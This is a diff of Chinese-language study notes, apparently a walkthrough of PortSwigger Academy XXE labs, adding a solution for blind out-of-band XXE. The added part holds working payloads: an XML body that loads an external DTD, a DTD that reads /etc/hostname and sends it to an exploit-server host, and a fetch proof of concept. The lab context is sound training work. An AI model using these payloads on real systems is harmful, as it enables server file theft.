@@ -1,8 +1,10 @@
 ---
 title: XML external entity (XXE) injection
 description: XML external entity (XXE) injection
+# last_update:
+#   date: "2025-08-27T08:00:00+08:00"
 last_update:
-  date: "2025-08-27T08:00:00+08:00"
+  date: "2025-11-09T08:00:00+08:00"
 ---
 
 ## Lab: Exploiting XXE using external entities to retrieve files
@@ -128,18 +130,73 @@ fetch(
 
 <!-- todo-yus Burp Suite Pro -->
 
-這題需要 Burp Suite Professional，之後再來解～
-
 ## Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
+
+<!-- last_update:
+  date: "2025-11-09T08:00:00+08:00" -->
 
 | Dimension | Description                                                                                        |
 | --------- | -------------------------------------------------------------------------------------------------- |
 | Document  | https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band |
 | Lab       | https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration               |
 
-<!-- todo-yus Burp Suite Pro -->
+這題雖然有說需要 Burp Collaborator，但實際上不用，所以免費仔也可以解這題
 
-這題需要 Burp Suite Professional，之後再來解～
+先查看 check stock 的 request body
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+    <productId>1</productId>
+    <storeId>1</storeId>
+</stockCheck>
+```
+
+嘗試改成
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0aa2002a03b4a062b4acb2e301860080.exploit-server.net/exploit"> %xxe;]>
+<stockCheck>
+    <productId>1</productId>
+    <storeId>1</storeId>
+</stockCheck>
+```
+
+exploit-server 構造
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-0aa2002a03b4a062b4acb2e301860080.exploit-server.net/?file=%file;'>">
+%eval;
+%exfiltrate;
+```
+
+完整的 HTTP Reuqest PoC
+
+```ts
+const xmlPayload = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0aa2002a03b4a062b4acb2e301860080.exploit-server.net/exploit"> %xxe;]>
+<stockCheck>
+    <productId>1</productId>
+    <storeId>1</storeId>
+</stockCheck>`;
+
+fetch(
+  "https://0a8700c603e0a0a2b4b0b3da007800c5.web-security-academy.net/product/stock",
+  {
+    headers: {
+      "content-type": "application/xml",
+    },
+    body: xmlPayload,
+    method: "POST",
+    mode: "cors",
+    credentials: "include",
+  },
+);
+```
+
+之後到 `/log` 查看 `/etc/hostname` 的內容，即可通關～
 
 ## Lab: Exploiting blind XXE to retrieve data via error messages
 
